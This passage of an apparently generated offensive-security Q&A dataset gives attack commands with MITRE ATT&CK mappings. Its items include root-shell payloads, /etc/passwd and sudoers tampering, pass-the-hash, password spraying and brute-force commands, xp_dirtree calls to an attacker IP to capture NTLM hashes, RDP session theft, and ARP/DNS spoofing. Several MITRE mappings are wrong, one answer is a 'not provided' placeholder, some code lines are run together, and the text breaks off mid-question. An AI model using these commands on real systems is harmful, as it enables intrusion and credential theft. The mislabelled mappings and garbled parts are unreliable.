A: The answer to this question was not provided in the given content. The content did not mention anything about accessing the internal service desk of companies using Atlassian. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can OutGuess 0.4 be used to hide data in JPEG images?
A: OutGuess 0.4 is a universal steganographic tool that can be used to hide data in the redundant bits of JPEG images. To hide data, use the following command:

```
outguess -k <key> -d <datafile> <input_image.jpg> <output_image.jpg>
```

This will embed the contents of `<datafile>` into the JPEG image using the provided `<key>`. To extract the hidden data, use:

```
outguess -r -k <key> <input_image.jpg> <extracted_data>
```

This will recover the hidden data from the JPEG image using the same `<key>`. OutGuess supports error correcting encoding to improve data recovery. MITRE References: MITRE ID is T1027, MITRE Name is: Obfuscated Files or Information, and MITRE Tactics are: Defense Evasion.

## Q: What is the Overpass The Hash/Pass The Key (PTK) attack and how can it be executed?
A: The Overpass The Hash/Pass The Key (PTK) attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network. To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions. The process can be initiated with commands like 'python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7' and 'python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass'. MITRE References: MITRE ID is T1550, MITRE Name is: Pass the Hash, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can Pacu be used to escalate user privileges in an AWS environment?
A: Pacu can be used to escalate user privileges in an AWS environment through various modules. For example, the 'privesc-via-role-manipulation' module can be used to find IAM roles that can be assumed by the current IAM user, and then attempt to escalate privileges by assuming those roles. The version 1.1.5 of Pacu provides this and other modules to identify and exploit privilege escalation vulnerabilities. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: PrivilegeEscalation.

## Q: How can Pacu be used to backdoor IAM users in an AWS environment?
A: Pacu can be used to backdoor IAM users in an AWS environment through the 'backdoor-iam-user' module. This module attempts to add the current IAM user to other IAM users' access keys, effectively backdooring those users and maintaining persistent access. The version 1.1.5 of Pacu provides this module to enable this type of attack. MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you use PadBuster to decrypt arbitrary ciphertext?
A: To decrypt arbitrary ciphertext using PadBuster version 0.3.3+git20210818.50e4a3e-1kali1, you can use the following command:

```padbuster URL EncryptedSample BlockSize -plaintext [String]```
This will allow you to decrypt the EncryptedSample by providing the URL, the encrypted sample, and the block size. You can also specify additional options like -cookies, -headers, -proxy, and more to customize the request. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you use PadBuster to encrypt arbitrary plaintext?
A: To encrypt arbitrary plaintext using PadBuster version 0.3.3+git20210818.50e4a3e-1kali1, you can use the following command:

```padbuster URL EncryptedSample BlockSize -encodedtext [Encoded String]```
This will allow you to encrypt the provided plaintext by specifying the URL, the encrypted sample, and the block size. You can also use additional options like -cookies, -headers, and -proxy to customize the request. MITRE References: MITRE ID is T1048, MITRE Name is: Exfiltration Over Alternative Protocol, and MITRE Tactics are: Exfiltration.

## Q: How can you exploit a padding oracle vulnerability?
A: You could use `https://github.com/AonCyberLabs/PadBuster` to exploit this kind of vulnerability or just run `sudo apt-get install padbuster`. To test if the cookie of a site is vulnerable, you could try `perl ./padBuster.pl http://10.10.10.10/index.php "RVJDQrwUdTRWJUVUeBKkEA==" 8 -encoding 0 -cookies "login=RVJDQrwUdTRWJUVUeBKkEA=="`. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can HPP be used to manipulate a banking application's transaction URL?
A: By inserting an additional `from` parameter in the transaction URL, the transaction may be incorrectly charged to the manipulated `accountC` instead of the original `accountA`, showcasing the potential of HPP to manipulate transactions or other functionalities such as password resets, 2FA settings, or API key requests. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can HPP be used to manipulate a One-Time Password (OTP) mechanism?
A: By intercepting the OTP request and duplicating the `email` parameter, the OTP meant for the initial email can be sent to the second email address specified in the manipulated request, allowing unauthorized access by circumventing the intended security measure. MITRE References: MITRE ID is T1204, MITRE Name is: User Execution, and MITRE Tactics are: Execution.

## Q: How can HPP be used to manipulate API key updates?
A: By appending an additional `api_key` parameter to the POST request, the server, processing only the last occurrence, can be made to update the API key to the attacker's provided value, giving the attacker control over the victim's API functionality. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion, Persistence, Privilege Escalation.

## Q: How can paros 3.2.13 be used to perform a vulnerability scan on a target website?
A: To perform a vulnerability scan using paros 3.2.13, follow these steps:1. Start the paros GUI with the command: `java -jar paros.jar`2. In the paros UI, go to the 'Site' tab and enter the target URL you want to scan.3. Go to the 'Scan' tab and click the 'Spider' button to crawl the target website.4. Once the spider has completed, click the 'Active Scan' button to start the vulnerability scan.5. paros will then scan the website and display any detected vulnerabilities in the 'Alerts' tab. MITRE References: MITRE ID is T1595, MITRE Name is: Active Scanning, and MITRE Tactics are: Discovery.

## Q: How can the 'pth-curl' tool be used for post-exploitation?
A: The 'pth-curl' tool is a modified version of Curl that supports pass-the-hash authentication. This allows an attacker to perform HTTP requests while using NTLM hashes instead of cleartext passwords. For example, to perform a POST request with pass-the-hash authentication, you can use the following command: 'pth-curl -u username%hash -d "data=value" http://target.com'. This can be useful for accessing web applications or APIs during a post-exploitation phase. MITRE References: MITRE ID is T1110.003, MITRE Name is: Brute Force: Password Spraying, and MITRE Tactics are: CredentialAccess, LateralMovement.

## Q: How can the 'pth-net' tool be used to gather information about a target domain?
A: The 'pth-net' tool is a modified version of the Samba 'net' command that supports pass-the-hash authentication. This allows an attacker to execute various 'net' commands against a target domain without providing a cleartext password. For example, you can use 'pth-net -U username%hash user list' to retrieve a list of domain users, or 'pth-net -U username%hash group list' to list the groups in the domain. This can be useful for gathering information about the target environment during a post-exploitation phase. MITRE References: MITRE ID is T1069.002, MITRE Name is: Permission Groups Discovery: Domain Groups, and MITRE Tactics are: Discovery.

## Q: How can the 'pth-smbget' tool be used to download files from the target system?
A: The 'pth-smbget' tool is a modified version of the Samba 'smbget' command that supports pass-the-hash authentication. This allows an attacker to download files from SMB shares on the target system without providing a cleartext password. For example, you can use 'pth-smbget -U username%hash smb://target.com/share/file.txt' to download a file from a shared folder. This can be useful for retrieving sensitive information or files from the target system during a post-exploitation phase. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Collection, Exfiltration.

## Q: How can the 'pth-wmic' tool be used to gather information about the target system?
A: The 'pth-wmic' tool is a modified version of the 'wmic' command that supports pass-the-hash authentication. This allows an attacker to execute WMI queries against the target system without providing a cleartext password. For example, you can use 'pth-wmic -U username%hash //target.com "select * from Win32_OperatingSystem"' to retrieve information about the target system's operating system. This can be useful for enumerating the target environment and gathering information during a post-exploitation phase. MITRE References: MITRE ID is T1012, MITRE Name is: Query Registry, and MITRE Tactics are: Discovery.

## Q: How can the 'pth-wmis' tool be used to execute commands on the target system?
A: The 'pth-wmis' tool is a modified version of the 'wmis' command that supports pass-the-hash authentication. This allows an attacker to remotely execute commands on the target system without providing a cleartext password. For example, you can use 'pth-wmis -U username%hash //target.com "cmd.exe /c dir c:\"' to execute a directory listing command on the target system. This can be useful for executing arbitrary commands or scripts on the target system during a post-exploitation phase. MITRE References: MITRE ID is T1021.006, MITRE Name is: Remote Services: Windows Remote Management, and MITRE Tactics are: LateralMovement, PrivilegeEscalation.

## Q: How can you perform password spraying from Windows?
A: From Windows, you can perform password spraying using the following tools:

**Rubeus (with brute module):**
```
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
**Invoke-DomainPasswordSpray (PowerShell):**
```
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
**Invoke-SprayEmptyPassword.ps1 (PowerShell):**
```
Invoke-SprayEmptyPassword
``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you perform brute force attacks on Kerberos?
A: You can perform brute force attacks on Kerberos using the following tool:

```
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you perform password spraying on Outlook Web Access?
A: There are multiple tools for password spraying Outlook Web Access:

- With MSF Owa_login
- With MSF Owa_ews_login
- With Ruler (reliable!)
- With DomainPasswordSpray (PowerShell)
- With MailSniper (PowerShell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.

Example using Ruler:
```
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
    [x] Failed: larsson:Summer2020
    [x] Failed: cube0x0:Summer2020
    [x] Failed: a.admin:Summer2020
    [x] Failed: c.cube:Summer2020
    [+] Success: s.svensson:Summer2020
``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you perform password spraying on Google and Okta?
A: For Google and Okta, you can use the following tools for password spraying:

Google:
* https://github.com/ustayready/CredKing/blob/master/credking.py

Okta:
* https://github.com/ustayready/CredKing/blob/master/credking.py
* https://github.com/Rhynorater/Okta-Password-Sprayer
* https://github.com/knavesec/CredMaster MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can attackers steal a user's authentication ticket to impersonate the user and gain unauthorized access?
A: In the Pass The Ticket (PTT) attack method, attackers steal a user's authentication ticket instead of their password or hash values. This stolen ticket is then used to impersonate the user, gaining unauthorized access to resources and services within a network. Tools like ticket_converter and Kekeo can be used to harvest and convert tickets between Linux and Windows platforms. On Linux, the ticket can be loaded into the environment using the KRB5CCNAME environment variable, and on Windows, the ticket can be loaded into memory using tools like mimikatz or Rubeus. MITRE References: MITRE ID is T1550, MITRE Name is: Use Alternate Authentication Material, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can Patator be used to brute force MySQL login credentials?
A: To brute force MySQL login credentials using Patator, you can run the following command:

patator mysql_login user=root password=FILE0 0=/root/passes.txt host=127.0.0.1 -x ignore:fgrep='Access denied for user'

This will use the Patator mysql_login module to attempt to log in to the MySQL server at 127.0.0.1 using the 'root' user and a wordlist of passwords from the /root/passes.txt file. The -x ignore:fgrep='Access denied for user' option tells Patator to ignore any output containing the string 'Access denied for user'.

Patator version 1.0 is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can Patator be used to enumerate valid users on a system using the SMTP VRFY command?
A: To enumerate valid users on a system using the SMTP VRFY command with Patator, you can run the following command:

patator smtp_vrfy host=127.0.0.1 user=FILE0 0=/root/usernames.txt

This will use the Patator smtp_vrfy module to attempt to verify each username in the /root/usernames.txt file against the SMTP server at 127.0.0.1. Patator will output any usernames that are determined to be valid.

Patator version 1.0 is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can Patator be used to perform a brute force attack against a web application?
A: To perform a brute force attack against a web application using Patator, you can run the following command:

patator http_fuzz url=http://example.com/login.php method=POST body='username=FILE0&password=FILE1' 0=/root/usernames.txt 1=/root/passwords.txt -x ignore:fgrep='Invalid login'

This will use the Patator http_fuzz module to send POST requests to the login.php page on the http://example.com website, using a list of usernames from /root/usernames.txt and a list of passwords from /root/passwords.txt. The -x ignore:fgrep='Invalid login' option tells Patator to ignore any responses that contain the 'Invalid login' string.

Patator version 1.0 is used in this example. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What is a payload to execute a bash shell while maintaining root privileges?
A: Copy
```
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
``` MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What is a C code payload to set the user ID to 0 (root) and execute a bash shell?
A: Copy
```
//gcc payload.c -o payload
int main(void){
    setresuid(0, 0, 0); //Set as user suid user
    system("/bin/sh");
    return 0;
}
``` MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What is a C code payload to escalate privileges to user ID 1000?
A: Copy
```
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    char *const paramList[10] = {"/bin/bash", "-p", NULL};
    const int id = 1000;
    setresuid(id, id, id);
    execve(paramList[0], paramList, NULL);
    return 0;
}
``` MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What are some scripts that can be used to escalate privileges?
A: Here are some example scripts that can be used to escalate privileges:

**www-data to sudoers**:
```
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

**Change root password**:
```
echo "root:hacked" | chpasswd
```

**Add new root user to /etc/passwd**:
```
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
``` MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Initial Access.

## Q: What are some ways that pdfcrack can be used for password cracking and recovery?
A: pdfcrack version 0.20-1 is a tool that can be used to recover passwords from PDF files. It supports cracking both owner and user passwords using either wordlists or brute-force attacks. Some key features include:
- Supports standard security handlers (rev 2, 3, 4) across all known PDF versions
- Can recover both owner and user passwords
- Allows using wordlists or brute-force to guess passwords
- Supports simple password permutations like capitalizing the first character
- Ability to save and load the state of a running cracking job
- Can perform benchmark testing to optimize the cracking process MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can peirates be used to escalate privileges and pivot through a Kubernetes cluster?
A: Peirates v1.1.14 is a Kubernetes penetration tool that can be used to escalate privileges and pivot through a cluster. It automates known techniques to steal and collect service accounts, obtain further code execution, and gain control of the cluster. For example, you can use peirates to list available pods, run commands in those pods, and access the API server with a stolen token: 

`peirates -L pod1,pod2,pod3 -c "whoami" -t <token>`

This would list the users in the specified pods and run the "whoami" command using a stolen token. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you perform FTP brute force attacks using Hydra?
A: To perform FTP brute force attacks using Hydra, you can use the following command:

```
hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp
```

Note that you'll need to provide a username for the brute force attack. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you perform banner grabbing on an IMAP server?
A: You can perform banner grabbing on an IMAP server using the following commands:

nc -nv <IP> 143
openssl s_client -connect <IP>:993 -quiet MITRE References: MITRE ID is T1071.001, MITRE Name is: Application Layer Protocol: Standard Application Layer Protocol, and MITRE Tactics are: TA0011.

## Q: How can you obtain sensitive information from an IMAP server that supports NTLM authentication?
A: If the IMAP server supports NTLM authentication (typically on Windows), you can obtain sensitive information like versions by performing the following steps:

root@kali: telnet example.com 143 
* OK The Microsoft Exchange IMAP4 service is ready. 
>> a1 AUTHENTICATE NTLM 
+ 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
+ TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA MITRE References: MITRE ID is T1003.003, MITRE Name is: OS Credential Dumping: NTLM Credentials, and MITRE Tactics are: TA0006.

## Q: How can you sniff clear text LDAP credentials?
A: If LDAP is used without SSL, you can sniff credentials in plain text in the network. You can also perform a MITM attack in the network between the LDAP server and the client, and make a Downgrade Attack so the client will use the credentials in clear text to login. If SSL is used, you can try to make a MITM by offering a false certificate, and if the user accepts it, you will be able to Downgrade the authentication method and see the credentials. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you extract password hashes from an LDAP server?
A: If you can access the files where the LDAP databases are contained (e.g., /var/lib/ldap), you can extract the password hashes using grep. You can then feed the hashes to tools like John the Ripper to attempt to crack them. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: What are some techniques for performing physical attacks on a machine?
A: If you have physical access to the machine, you should read some [**tricks about physical attacks**](/hardware-physical-access/physical-attacks) and others about [**escaping from GUI applications**](/hardware-physical-access/escaping-from-gui-applications). MITRE References: MITRE ID is T0821, MITRE Name is: Physical Access, and MITRE Tactics are: TA0009.

## Q: How can you steal credentials or sniff data from a network during an internal penetration test?
A: Before attacking a host, you may want to **steal some credentials** **from the network** or **sniff** some **data** to learn **passively/actively(MitM)** what can you find inside the network. You can read [**Pentesting Network**](/generic-methodologies-and-resources/pentesting-network#sniffing) for more information. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: TA0006.

## Q: How can you use brute-force techniques to compromise services during a penetration test?
A: In some scenarios a **Brute-Force** could be useful to **compromise** a **service**. [**Find here a CheatSheet of different services brute forcing**](/generic-methodologies-and-resources/brute-force)**.** MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: What are some techniques for getting a shell on a target system?
A: Somehow you should have found **some way to execute code** in the victim. Then, [a list of possible tools inside the system that you can use to get a reverse shell would be very useful](/generic-methodologies-and-resources/shells). MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0002.

## Q: What are some common tools and techniques for data exfiltration during a penetration test?
A: You will probably need to **extract some data from the victim** or even **introduce something** (like privilege escalation scripts). **Here you have a** [**post about common tools that you can use with these purposes**](/generic-methodologies-and-resources/exfiltration)**.** MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: TA0010.

## Q: How can you steal NetNTLM hashes or perform a relay attack using MSSQL?
A: You can steal NetNTLM hashes by starting an SMB server (like Responder or impacket-smbserver) and then executing one of the following functions on the MSSQL server: `xp_dirtree '\\<attacker_IP>\any\thing'`, `exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'`, `EXEC master..xp_subdirs '\\<attacker_IP>\anything\'`, or `EXEC master..xp_fileexist '\\<attacker_IP>\anything\'`. This will cause the MSSQL server to authenticate to your SMB server, allowing you to capture the NetNTLM hash. MITRE References: MITRE ID is T1212, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Lateral Movement, Privilege Escalation.

## Q: How can you impersonate other users on an MSSQL server?
A: SQL Server has a special permission called `IMPERSONATE` that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. You can find users you can impersonate using the query: `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`. Then, you can impersonate a user using: `EXECUTE AS LOGIN = 'RegUser'`. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use MySQL for arbitrary file read/write?
A: If the MySQL server has the FILE privilege enabled, you can use the 'load data local infile' command to read arbitrary files on the client system:

load data local infile '/etc/passwd' into table test FIELDS TERMINATED BY '\n';

This allows the MySQL server to request the client to read the file and send the contents. By connecting to a rogue MySQL server, an attacker can leverage this to read arbitrary files on the client system.

To extend this to remote code execution, an attacker can use this to upload a malicious library, create a user defined function, and execute commands on the server. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0004.

## Q: How can you perform ARP spoofing to intercept network traffic?
A: ARP Spoofing consist on sending gratuitous ARPResponses to indicate that the IP of a machine has the MAC of our device. Then, the victim will change the ARP table and will contact our machine every time it wants to contact the IP spoofed.

You can use Bettercap for this:

```
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```

Or arpspoof:

```
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
``` MITRE References: MITRE ID is T1557, MITRE Name is: ARP Spoofing, and MITRE Tactics are: TA0006, TA0011.

## Q: How can you perform DHCP spoofing to deliver malicious content to clients?
A: A rogue DHCP server can be set up using the DHCP script located at `/usr/share/responder/DHCP.py`. This is useful for network attacks, like capturing HTTP traffic and credentials, by redirecting traffic to a malicious server. However, setting a rogue gateway is less effective since it only allows capturing outbound traffic from the client, missing the responses from the real gateway. Instead, setting up a rogue DNS or WPAD server is recommended for a more effective attack.

Below are the command options for configuring the rogue DHCP server:

* **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
* **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
* **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
* **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
* **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
* **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
* **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
* **WPAD Configuration Address**: Use `-w "http://10.0.0.100/wpad.dat"` to set the address for WPAD configuration, assisting in web traffic interception.
* **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
* **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected. MITRE References: MITRE ID is T1584.002, MITRE Name is: Compromise Software Supply Chain: Malicious Content, and MITRE Tactics are: TA0001, TA0005, TA0011.

## Q: How can you perform DNS spoofing to redirect users to malicious sites?
A: The attacker will resolve some (or all) the domains that the victim asks for. You can configure this in Bettercap:

```
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```

Alternatively, you can set up your own DNS server with dnsmasq:

```
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
``` MITRE References: MITRE ID is T1498.001, MITRE Name is: Network Denial of Service: Direct Network Denial of Service, and MITRE Tactics are: TA0006, TA0011.

## Q: How can you use Bettercap to perform network discovery and spoofing attacks?
A: Bettercap is a powerful tool that can be used for various network discovery and spoofing attacks. Here are some examples:Discovery:- `net.probe on/off`: Discover hosts on the current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD- `net.show`: Show discovered hosts- `net.show.meta true`: Show more information about discovered hostsSpoofing:- `arp.spoof on`: Perform ARP spoofing- `set arp.spoof.targets <IP>`: Specify targets to ARP spoof- `wifi.deauth BSSID`: Perform WiFi deauthentication attacks- `set wifi.ap.ssid Banana`: Configure a fake WiFi access point- `set wifi.ap.bssid DE:AD:BE:EF:DE:AD`: Set the fake WiFi access point BSSID- `set wifi.ap.channel 5`: Set the fake WiFi access point channel- `set wifi.ap.encryption false`: Set the fake WiFi access point encryption (true for WPA2)- `wifi.ap`: Start the fake WiFi access pointBettercap provides a flexible and scriptable interface to perform a wide range of network attacks. The above examples demonstrate some of the key capabilities for discovery and spoofing. MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How do you perform banner grabbing on a POP3 server?
A: You can perform banner grabbing on a POP3 server using the following commands:

1. For plain text POP3 (port 110):
   ```
   nc -nv <IP> 110
   ```
2. For SSL/TLS-encrypted POP3 (port 995):
   ```
   openssl s_client -connect <IP>:995 -crlf -quiet
   ``` MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you perform a brute-force attack against a POP3 server?
A: To perform a brute-force attack against a POP3 server, you can use the following Hydra command:

```
hydra -l <Username> -P <Big_Passwordlist> -f <IP> pop3 -V
```
This will attempt to brute-force the POP3 login using the provided username and password list. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you brute force PostgreSQL credentials?
A: You can brute force PostgreSQL credentials using a wordlist attack, as detailed in the [Brute force](/generic-methodologies-and-resources/brute-force#postgresql) section. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you achieve remote code execution (RCE) in PostgreSQL?
A: You can achieve RCE in PostgreSQL in the following ways:1. Using the COPY FROM PROGRAM command, if you are a superuser or a member of the pg_execute_server_program group.2. By exploiting PostgreSQL languages, such as PL/pgSQL, PL/Perl, or PL/Python, if you have the necessary permissions.3. By uploading a malicious PostgreSQL extension and loading it, if you have the ability to write files to the server. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: How can you further escalate privileges in PostgreSQL by overwriting internal tables?
A: If you can read and write PostgreSQL server files, you can become a superuser by overwriting the filenode associated with the internal pg_authid table. This can be done by:1. Obtaining the PostgreSQL data directory.2. Downloading the filenode for the pg_authid table.3. Modifying the filenode to set all rol* boolean flags to 1, granting full permissions.4. Uploading the modified filenode back to the original location. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation.

## Q: How can you brute force RDP credentials?
A: You can use tools like Crowbar or Hydra to brute force RDP credentials, but you should be careful as this could lock accounts:

```# https://github.com/galkan/crowbarcrowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'# hydra  hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can you connect to an RDP service using known credentials or a hash?
A: You can use the following commands to connect to an RDP service using known credentials or a hash:

```rdesktop -u <username> <IP>rdesktop -d <domain> -u <username> -p <password> <IP>xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash``` MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Initial Access, Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you steal an RDP session?
A: With SYSTEM permissions, you can access any opened RDP session by any user without needing to know the password of the owner. You can get the opened sessions using the `query user` command, and then access the selected session using the `tscon <ID> /dest:<SESSIONNAME>` command. This will allow you to interact with the virtual desktops of the user, including accessing passwords in notepad without them being saved to disk, and other RDP sessions opened on other machines. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use Mimikatz to steal an RDP session?
A: You can use Mimikatz to steal an RDP session by first getting the sessions using the `ts::sessions` command, and then connecting to the selected session using the `ts::remote /id:2` command. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you attack low-frequency (125kHz) RFID tags using the Flipper Zero?
A: You can **attack these Tags with the Flipper Zero**:

[pageFZ - 125kHz RFID](/todo/radio-hacking/flipper-zero/fz-125khz-rfid) MITRE References: MITRE ID is T1200, MITRE Name is: Hardware Additions, and MITRE Tactics are: Initial Access.

## Q: How can you brute force rlogin?
A: You can brute force rlogin using the techniques described in the [Brute force](/generic-methodologies-and-resources/brute-force#rlogin) section. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006, Credential Access.

## Q: How can you bypass a filtered Portmapper port?
A: When port 111 is filtered, you can bypass this by simulating a Portmapper service locally and creating a tunnel from your machine to the target. This allows you to access NFS services, which are commonly used with Portmapper. For detailed guidance, refer to the article available at [this link](https://medium.com/@sebnemK/how-to-bypass-filtered-portmapper-port-111-27cee52416bc). MITRE References: MITRE ID is T1090, MITRE Name is: Proxy, and MITRE Tactics are: TA0011.

## Q: How can you leverage NIS vulnerabilities during a pentest?
A: To explore NIS vulnerabilities, start by identifying the `ypbind` service. Then, use `ypwhich` to confirm the NIS server's presence by pinging it with the domain name and server IP. Finally, use the `ypcat` command to extract sensitive data, particularly encrypted user passwords, which can then be cracked using tools like John the Ripper. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can you brute force login to a remote system using Rsh?
